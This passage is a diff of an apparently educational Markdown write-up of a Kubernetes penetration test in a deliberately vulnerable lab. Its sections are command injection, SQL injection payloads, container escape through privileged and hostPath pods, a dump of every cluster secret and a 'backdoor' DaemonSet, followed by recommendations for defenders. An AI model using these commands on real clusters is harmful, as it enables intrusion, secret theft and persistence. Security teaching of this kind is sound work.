- pods -n vulnerable-lab
+kubectl get pods -n vulnerable-lab
 ```
 
 **What you’ll see**: kubectl will return lists of resources, confirming it’s working.
@@ -1081,60 +785,14 @@ get
 **The commands**:
 
 ```text
-# 
-Get
- 
-all
- resources 
-in
- vulnerable
--
-lab 
-with
- details
-kubectl 
-get
- 
-all
- 
--
-n vulnerable
--
-lab 
--
-o wide
-# 
-Get
- 
-all
- secrets
-kubectl 
-get
- secrets 
--
-n vulnerable
--
-lab
-# 
-Get
- service accounts
-kubectl 
-get
- serviceaccounts 
--
-n vulnerable
--
-lab
-# 
-Get
- the cluster role binding that gives us cluster
--
-admin
-kubectl 
-get
- clusterrolebindings 
-|
- grep vulnerable
+# Get all resources in vulnerable-lab with details
+kubectl get all -n vulnerable-lab -o wide
+# Get all secrets
+kubectl get secrets -n vulnerable-lab
+# Get service accounts
+kubectl get serviceaccounts -n vulnerable-lab
+# Get the cluster role binding that gives us cluster-admin
+kubectl get clusterrolebindings | grep vulnerable
 ```
 
 **What this shows us**: We can see the ClusterRoleBinding that gives our service account cluster-admin permissions. This is the misconfiguration that allows our attack.
@@ -1163,27 +821,16 @@ Lateral movement is when you move from one part of the system to another. We alr
 
 ```text
 # Execute a command via the vulnerable API
-curl -s -X 
-POST
- 
-http:
-/
-/192.168.49.2:30081/api
-/execute \
-  -H "Content-Type: application/json
-" \
-  -d '{"
-command
-":"
-id
-"}'
+curl -s -X POST http://192.168.49.2:30081/api/execute \
+  -H "Content-Type: application/json" \
+  -d '{"command":"id"}'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*km_-U4HVk7z7bXL4MzJFrw.png" alt="Article image" width="1319" height="98" loading="lazy" decoding="async" />
 
 **What this does**:
 
-- Makes a POST request to the`/api/execute`endpoint
+- Makes a POST request to the `/api/execute` endpoint
 
 - Sends JSON data with a “command” field
 
@@ -1193,51 +840,28 @@ id
 
 ```text
 {
-  
-"success"
-: 
-true
-,
-  
-"output"
-: 
-"uid=0(root) gid=0(root) groups=0(root)
-\n
-"
-,
-  
-"stderr"
-: 
-""
+  "success": true,
+  "output": "uid=0(root) gid=0(root) groups=0(root)\n",
+  "stderr": ""
 }
 ```
 
-**What this means**: The command executed successfully, and we’re running as**root**(the superuser)! This is very bad from a security perspective.
+**What this means**: The command executed successfully, and we’re running as **root** (the superuser)! This is very bad from a security perspective.
 
 **Try more commands**:
 
 ```text
 # See what user we are
 curl -s -X POST http://192.168.49.2:30081/api/execute \
-  -H 
-"Content-Type: application/json"
- \
-  -d 
-'{"command":"whoami"}'
-# List files in the current directory
+  -H "Content-Type: application/json" \
+  -d '{"command":"whoami"}'# List files in the current directory
 curl -s -X POST http://192.168.49.2:30081/api/execute \
-  -H 
-"Content-Type: application/json"
- \
-  -d 
-'{"command":"ls -la"}'
+  -H "Content-Type: application/json" \
+  -d '{"command":"ls -la"}'
 # See environment variables
 curl -s -X POST http://192.168.49.2:30081/api/execute \
-  -H 
-"Content-Type: application/json"
- \
-  -d 
-'{"command":"env"}'
+  -H "Content-Type: application/json" \
+  -d '{"command":"env"}'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*7b0w8mCRbgnnAD6jgS4WNw.png" alt="Article image" width="1918" height="957" loading="lazy" decoding="async" />
@@ -1259,7 +883,7 @@ curl -s http://192.168.49.2:30081/api/env
 
 **What you’ll get**: A JSON response with all environment variables. During testing, we found:
 
-- Internal service IPs (like`10.104.15.172`for vuln-app1)
+- Internal service IPs (like `10.104.15.172` for vuln-app1)
 
 - Kubernetes API server address (`10.96.0.1:443`)
 
@@ -1281,8 +905,7 @@ curl -s http://192.168.49.2:30081/api/env
 
 ```text
 # Normal search - this is how it's supposed to work
-curl -s 
-"http://192.168.49.2:30080/?username=test"
+curl -s "http://192.168.49.2:30080/?username=test"
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*9RdpTe9h2IBxDU2ttrKmpg.png" alt="Article image" width="1857" height="734" loading="lazy" decoding="async" />
@@ -1291,13 +914,12 @@ curl -s
 
 ```text
 # SQL injection - this breaks the query and returns all users
-curl -s 
-"http://192.168.49.2:30080/?username=test' OR '1'='1"
+curl -s "http://192.168.49.2:30080/?username=test' OR '1'='1"
 ```
 
 **What this does**:
 
-- The`' OR '1'='1`part makes the SQL query always true
+- The `' OR '1'='1` part makes the SQL query always true
 
 - Instead of searching for “test”, it returns all users
 
@@ -1309,11 +931,9 @@ curl -s
 
 ```text
 # Try to extract database information
-curl -s 
-"http://192.168.49.2:30080/?username=test' UNION SELECT 1,2,3--"
+curl -s "http://192.168.49.2:30080/?username=test' UNION SELECT 1,2,3--"
 # Try to extract table names
-curl -s 
-"http://192.168.49.2:30080/?username=test' UNION SELECT table_name,2,3 FROM information_schema.tables--"
+curl -s "http://192.168.49.2:30080/?username=test' UNION SELECT table_name,2,3 FROM information_schema.tables--"
 ```
 
 **Why this matters**: SQL injection can lead to data theft, which is a serious security issue.
@@ -1337,35 +957,8 @@ Container escape is when you break out of a container and access the host system
 **The command**:
 
 ```text
-# 
-Find
- all privileged pods
-kubectl 
-get
- pods 
--
-A
- 
--
-o json 
-|
- jq 
--
-r '.items[] 
-|
- select(.spec.containers[].securityContext.privileged 
-==
- 
-true
-) 
-|
- 
-"
-\(.metadata.namespace)
-/
-\(.metadata.name)
-"
-'
+# Find all privileged pods
+kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*kWCT0ljoDutnm-UL_SV7OQ.png" alt="Article image" width="1684" height="302" loading="lazy" decoding="async" />
@@ -1374,17 +967,17 @@ true
 
 - Gets all pods in JSON format
 
-- Filters for pods where`privileged: true`
+- Filters for pods where `privileged: true`
 
 - Shows them as “namespace/podname”
 
 **What we found**: Multiple privileged pods including:
 
-- `vulnerable-lab/docker-socket-mount-*`- Has access to Docker socket
+- `vulnerable-lab/docker-socket-mount-*` - Has access to Docker socket
 
-- `vulnerable-lab/host-network-pod-*`- Uses host network
+- `vulnerable-lab/host-network-pod-*` - Uses host network
 
-- `vulnerable-lab/privileged-container-*`- General privileged containers
+- `vulnerable-lab/privileged-container-*` - General privileged containers
 
 ### Step 2: Access a Privileged Pod
 
@@ -1396,24 +989,11 @@ true
 
 ```text
 # Get the name of a privileged pod
-POD_NAME=$(kubectl get pods -n vulnerable-lab -l app=docker-socket -o jsonpath=
-'{.items[0].metadata.name}'
-)
+POD_NAME=$(kubectl get pods -n vulnerable-lab -l app=docker-socket -o jsonpath='{.items[0].metadata.name}')
 # Execute a command in that pod
-kubectl 
-exec
- -n vulnerable-lab 
-$POD_NAME
- -- 
-id
+kubectl exec -n vulnerable-lab $POD_NAME -- id
 # List the Docker socket (this proves we have host access)
-kubectl 
-exec
- -n vulnerable-lab 
-$POD_NAME
- -- 
-ls
- -la /var/run/docker.sock
+kubectl exec -n vulnerable-lab $POD_NAME -- ls -la /var/run/docker.sock
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*Myp0iphzGKJr9BoeyAI7pA.png" alt="Article image" width="1655" height="214" loading="lazy" decoding="async" />
@@ -1422,7 +1002,7 @@ ls
 
 - Finds a pod with Docker socket access
 
-- Executes the`id`command inside it
+- Executes the `id` command inside it
 
 - Lists the Docker socket file
 
@@ -1438,27 +1018,18 @@ ls
 
 ```text
 # Find a pod with hostPath mount
-kubectl get pods -n vulnerable-lab -o json | jq -r 
-'.items[] | select(.spec.volumes[].hostPath != null) | "\(.metadata.namespace)/\(.metadata.name)"'
+kubectl get pods -n vulnerable-lab -o json | jq -r '.items[] | select(.spec.volumes[].hostPath != null) | "\(.metadata.namespace)/\(.metadata.name)"'
 # Access one of these pods
-POD_NAME=$(kubectl get pods -n vulnerable-lab -l app=hostpath -o jsonpath=
-'{.items[0].metadata.name}'
-)
+POD_NAME=$(kubectl get pods -n vulnerable-lab -l app=hostpath -o jsonpath='{.items[0].metadata.name}')
 # List host filesystem (mounted at /host)
-kubectl 
-exec
- -n vulnerable-lab 
-$POD_NAME
- -- 
-ls
- -la /host/etc
+kubectl exec -n vulnerable-lab $POD_NAME -- ls -la /host/etc
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*XxqwCgWYVoAQcuaEforAQQ.png" alt="Article image" width="1333" height="914" loading="lazy" decoding="async" />
 
-**What this does**: Accesses the host’s`/etc`directory through a mounted volume.
+**What this does**: Accesses the host’s `/etc` directory through a mounted volume.
 
-**Why this is critical**: If we can read the host’s`/etc`directory, we can potentially read passwords, SSH keys, or other sensitive files.
+**Why this is critical**: If we can read the host’s `/etc` directory, we can potentially read passwords, SSH keys, or other sensitive files.
 
 ## Phase 7: Full Cluster Compromise
 
@@ -1480,67 +1051,22 @@ Full cluster compromise means we can do anything we want: create resources, dele
 
 ```text
 # Create a file defining our malicious pod
-cat
- 
->
- 
-~/blackbox-pentest/exploitation/malicious-pod.yaml
- 
-<<
- 
-'EOF'
-apiVersion:
- 
-v1
-kind:
- 
-Pod
+cat > ~/blackbox-pentest/exploitation/malicious-pod.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
 metadata:
-  
-name:
- 
-attacker-pod
-  
-namespace:
- 
-vulnerable-lab
+  name: attacker-pod
+  namespace: vulnerable-lab
 spec:
-  
-containers:
-  
--
- 
-name:
- 
-attacker
-    
-image:
- 
-alpine:latest
-    
-command:
- [
-"sleep"
-, 
-"infinity"
-]
-    
-securityContext:
-      
-privileged:
- 
-true
-      
-capabilities:
-        
-add:
- [
-"ALL"
-]
-  
-serviceAccountName:
- 
-vulnerable-sa-1
+  containers:
+  - name: attacker
+    image: alpine:latest
+    command: ["sleep", "infinity"]
+    securityContext:
+      privileged: true
+      capabilities:
+        add: ["ALL"]
+  serviceAccountName: vulnerable-sa-1
 EOF
 ```
 
@@ -1560,13 +1086,7 @@ EOF
 # Create the pod
 kubectl apply -f ~/blackbox-pentest/exploitation/malicious-pod.yaml
 # Wait for it to be ready
-kubectl 
-wait
- --
-for
-=condition=Ready pod/attacker-pod -n vulnerable-lab --
-timeout
-=60s
+kubectl wait --for=condition=Ready pod/attacker-pod -n vulnerable-lab --timeout=60s
 # Verify it's running
 kubectl get pod attacker-pod -n vulnerable-lab
 ```
@@ -1584,62 +1104,10 @@ kubectl get pod attacker-pod -n vulnerable-lab
 **The command**:
 
 ```text
-# 
-Get
- 
-all
- secrets 
-from
- 
-all
- namespaces
-kubectl 
-get
- secrets 
--
-A 
--
-o yaml 
->
- 
-~
-/
-blackbox
--
-pentest
-/
-proof
-/
-all
--
-secrets.yaml
-# Also 
-get
- them 
-in
- JSON 
-for
- easier parsing
-kubectl 
-get
- secrets 
--
-A 
--
-o json 
->
- 
-~
-/
-blackbox
--
-pentest
-/
-proof
-/
-all
--
-secrets.json
+# Get all secrets from all namespaces
+kubectl get secrets -A -o yaml > ~/blackbox-pentest/proof/all-secrets.yaml
+# Also get them in JSON for easier parsing
+kubectl get secrets -A -o json > ~/blackbox-pentest/proof/all-secrets.json
 ```
 
 **What this does**: Exports all secrets to files. These files contain passwords, tokens, certificates, and other sensitive data.
@@ -1656,90 +1124,28 @@ secrets.json
 
 ```text
 # Create a pod that mounts the host root filesystem
-cat
- 
->
- 
-~/blackbox-pentest/exploitation/host-access-pod.yaml
- 
-<<
- 
-'EOF'
-apiVersion:
- 
-v1
-kind:
- 
-Pod
+cat > ~/blackbox-pentest/exploitation/host-access-pod.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
 metadata:
-  
-name:
- 
-host-access
-  
-namespace:
- 
-vulnerable-lab
+  name: host-access
+  namespace: vulnerable-lab
 spec:
-  
-containers:
-  
--
- 
-name:
- 
-attacker
-    
-image:
- 
-alpine:latest
-    
-command:
- [
-"sleep"
-, 
-"infinity"
-]
-    
-volumeMounts:
-    
--
- 
-name:
- 
-host-root
-      
-mountPath:
- 
-/host
-    
-securityContext:
-      
-privileged:
- 
-true
-  
-volumes:
-  
--
- 
-name:
- 
-host-root
-    
-hostPath:
-      
-path:
- 
-/
-      
-type:
- 
-Directory
-  
-serviceAccountName:
- 
-vulnerable-sa-1
+  containers:
+  - name: attacker
+    image: alpine:latest
+    command: ["sleep", "infinity"]
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+    securityContext:
+      privileged: true
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+  serviceAccountName: vulnerable-sa-1
 EOF
 ```
 
@@ -1749,25 +1155,11 @@ EOF
 # Create the pod
 kubectl apply -f ~/blackbox-pentest/exploitation/host-access-pod.yaml
 # Wait for it
-kubectl 
-wait
- --
-for
-=condition=Ready pod/host-access -n vulnerable-lab --
-timeout
-=60s
+kubectl wait --for=condition=Ready pod/host-access -n vulnerable-lab --timeout=60s
 # Access the host filesystem
-kubectl 
-exec
- -n vulnerable-lab host-access -- 
-ls
- -la /host/etc
+kubectl exec -n vulnerable-lab host-access -- ls -la /host/etc
 # Read host files
-kubectl 
-exec
- -n vulnerable-lab host-access -- 
-cat
- /host/etc/passwd
+kubectl exec -n vulnerable-lab host-access -- cat /host/etc/passwd
 ```
 
 **What this proves**: We have complete access to the node’s filesystem. We can read any file, modify system configurations, or install backdoors.
@@ -1784,80 +1176,28 @@ cat
 
 ```text
 # Create a DaemonSet backdoor
-cat
- 
->
- 
-~/blackbox-pentest/exploitation/backdoor-daemonset.yaml
- 
-<<
- 
-'EOF'
-apiVersion:
- 
-apps/v1
-kind:
- 
-DaemonSet
+cat > ~/blackbox-pentest/exploitation/backdoor-daemonset.yaml << 'EOF'
+apiVersion: apps/v1
+kind: DaemonSet
 metadata:
-  
-name:
- 
-backdoor
-  
-namespace:
- 
-vulnerable-lab
+  name: backdoor
+  namespace: vulnerable-lab
 spec:
-  
-selector:
-    
-matchLabels:
-      
-app:
- 
-backdoor
-  
-template:
-    
-metadata:
-      
-labels:
-        
-app:
- 
-backdoor
-    
-spec:
-      
-containers:
-      
--
- 
-name:
- 
-backdoor
-        
-image:
- 
-alpine:latest
-        
-command:
- [
-"sleep"
-, 
-"infinity"
-]
-        
-securityContext:
-          
-privileged:
- 
-true
-      
-serviceAccountName:
- 
-vulnerable-sa-1
+  selector:
+    matchLabels:
+      app: backdoor
+  template:
+    metadata:
+      labels:
+        app: backdoor
+    spec:
+      containers:
+      - name: backdoor
+        image: alpine:latest
+        command: ["sleep", "infinity"]
+        securityContext:
+          privileged: true
+      serviceAccountName: vulnerable-sa-1
 EOF
 ```
 
@@ -1905,7 +1245,7 @@ kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A -o yaml > ~/b
 
 Here’s what we accomplished, step by step:
 
-- **Reconnaissance**(Phase 0)
+- **Reconnaissance** (Phase 0)
 
 - Scanned the target and found 9 open ports
 
@@ -1913,7 +1253,7 @@ Here’s what we accomplished, step by step:
 
 - Discovered the Kubernetes API server
 
-**2. Initial Access**(Phase 1)
+**2. Initial Access** (Phase 1)
 
 - Used port 30082 to extract a service account token
 
@@ -1921,7 +1261,7 @@ Here’s what we accomplished, step by step:
 
 - **Time to compromise: ~5 minutes**
 
-**3. Information Disclosure**(Phase 2)
+**3. Information Disclosure** (Phase 2)
 
 - Enumerated all namespaces, pods, secrets, and service accounts
 
@@ -1929,19 +1269,19 @@ Here’s what we accomplished, step by step:
 
 - Identified privileged containers
 
-**4. Privilege Escalation**(Phase 3)
+**4. Privilege Escalation** (Phase 3)
 
 - Already had cluster-admin (no escalation needed)
 
 - Verified we can create resources
 
-**5. Cluster Access**(Phase 4)
+**5. Cluster Access** (Phase 4)
 
 - Configured kubectl for easy access
 
 - Gained full command-line control
 
-**6. Lateral Movement**(Phase 5)
+**6. Lateral Movement** (Phase 5)
 
 - Exploited command injection (port 30081) for root shell
 
@@ -1949,13 +1289,13 @@ Here’s what we accomplished, step by step:
 
 - Extracted environment variables
 
-**7. Container Escape**(Phase 6)
+**7. Container Escape** (Phase 6)
 
 - Accessed privileged containers
 
 - Gained access to host filesystem
 
-**8. Full Compromise**(Phase 7)
+**8. Full Compromise** (Phase 7)
 
 - Created malicious pods
 
@@ -1967,11 +1307,11 @@ Here’s what we accomplished, step by step:
 
 ### Total Time to Full Compromise
 
-**Approximately 1.5–2 hours**from start to finish.
+**Approximately 1.5–2 hours** from start to finish.
 
 ### Key Vulnerabilities Exploited
 
-- **Token Exposure**(Port 30082) —**CRITICAL**
+- **Token Exposure** (Port 30082) — **CRITICAL**
 
 - Service account token exposed via web endpoint
 
@@ -1979,7 +1319,7 @@ Here’s what we accomplished, step by step:
 
 - **Impact**: Immediate full cluster access
 
-**2. Command Injection**(Port 30081) —**HIGH**
+**2. Command Injection** (Port 30081) — **HIGH**
 
 - API endpoint executes system commands
 
@@ -1987,19 +1327,19 @@ Here’s what we accomplished, step by step:
 
 - **Impact**: Remote code execution
 
-**3. SQL Injection**(Port 30080) —**MEDIUM**
+**3. SQL Injection** (Port 30080) — **MEDIUM**
 
 - User search vulnerable to SQL injection
 
 - **Impact**: Database access, data theft
 
-**4. Privileged Containers**—**HIGH**
+**4. Privileged Containers** — **HIGH**
 
 - Multiple containers with privileged access
 
 - **Impact**: Container escape, host access
 
-**5. Overly Permissive RBAC**—**CRITICAL**
+**5. Overly Permissive RBAC** — **CRITICAL**
 
 - Service account bound to cluster-admin
 
@@ -2007,19 +1347,19 @@ Here’s what we accomplished, step by step:
 
 ## Recommendations
 
-- **Remove token exposure endpoint**— Never expose service account tokens
+- **Remove token exposure endpoint** — Never expose service account tokens
 
-- **Fix command injection**— Sanitize all user input
+- **Fix command injection** — Sanitize all user input
 
-- **Fix SQL injection**— Use parameterized queries
+- **Fix SQL injection** — Use parameterized queries
 
-- **Remove cluster-admin binding**— Use least privilege principle
+- **Remove cluster-admin binding** — Use least privilege principle
 
-- **Remove privileged containers**— Only use when absolutely necessary
+- **Remove privileged containers** — Only use when absolutely necessary
 
-- **Implement network policies**— Restrict pod-to-pod communication
+- **Implement network policies** — Restrict pod-to-pod communication
 
-- **Enable Pod Security Standards**— Enforce security policies
+- **Enable Pod Security Standards** — Enforce security policies
 
 ## Conclusion
 
@@ -2027,13 +1367,13 @@ This guide demonstrated a complete black-box penetration test of a Kubernetes cl
 
 ### Key Takeaways
 
-- **Token exposure is critical**— Exposing service account tokens can lead to immediate cluster compromise
+- **Token exposure is critical** — Exposing service account tokens can lead to immediate cluster compromise
 
-- **Web application vulnerabilities matter**— SQL injection and command injection are still common
+- **Web application vulnerabilities matter** — SQL injection and command injection are still common
 
-- **RBAC misconfigurations are dangerous**— Overly permissive roles can give attackers full control
+- **RBAC misconfigurations are dangerous** — Overly permissive roles can give attackers full control
 
-- **Privileged containers are risky**— They can lead to container escape and host compromise
+- **Privileged containers are risky** — They can lead to container escape and host compromise
 
 ### For Defenders
 
